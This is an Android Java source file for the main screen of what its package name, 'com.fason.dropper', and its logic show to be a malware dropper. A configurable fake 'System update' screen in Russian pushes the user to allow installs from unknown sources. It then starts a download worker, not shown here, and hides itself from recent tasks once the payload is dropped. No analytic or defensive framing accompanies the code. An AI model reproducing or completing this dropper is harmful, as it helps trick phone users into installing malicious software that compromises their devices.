package com.fason.dropper;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.Gravity;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

public class MainActivity extends Activity {

    private final Handler h = new Handler(Looper.getMainLooper());
    private TextView status;
    private ProgressBar bar;
    private Config cfg;
    private boolean started = false;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        cfg = Config.load(this);

        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER);
        root.setPadding(64, 64, 64, 64);
        root.setBackgroundColor(Color.WHITE);

        TextView title = new TextView(this);
        title.setText(cfg.fakeUi ? "Обновление системы" : cfg.appName);
        title.setTextSize(22);
        title.setTypeface(Typeface.DEFAULT_BOLD);
        title.setGravity(Gravity.CENTER);

        status = new TextView(this);
        status.setText("Подготовка…");
        status.setTextSize(14);
        status.setGravity(Gravity.CENTER);
        status.setPadding(0, 24, 0, 24);

        bar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        bar.setMax(100);

        root.addView(title);
        root.addView(bar, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 12));
        root.addView(status);
        setContentView(root);

        h.postDelayed(tick, 300);
    }

    private final Runnable tick = new Runnable() {
        @Override
        public void run() {
            bar.setProgress(DropState.pct);
            status.setText(DropState.error != null ? DropState.error : DropState.msg);
            if (!started && DropState.pct == 0 && DropState.msg.isEmpty()) ensurePermission();
            if (DropState.done && DropState.pct >= 100) {
                h.postDelayed(() -> {
                    try { finishAndRemoveTask(); } catch (Exception ignored) {}
                }, 2500);
                return;
            }
            h.postDelayed(this, 400);
        }
    };

    private void ensurePermission() {
        started = true;
        if (android.os.Build.VERSION.SDK_INT >= 26
                && !getPackageManager().canRequestPackageInstalls()) {
            status.setText("Разрешите установку");
            try {
                startActivity(new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                        Uri.parse("package:" + getPackageName())));
            } catch (Exception ignored) {
            }
            h.postDelayed(() -> {
                DropState.msg = "Загрузка…";
                DropWorker.start(this);
            }, 4000);
            return;
        }
        DropState.msg = "Загрузка…";
        DropWorker.start(this);
    }

    @Override
    protected void onDestroy() {
        h.removeCallbacksAndMessages(null);
        super.onDestroy();
    }
}
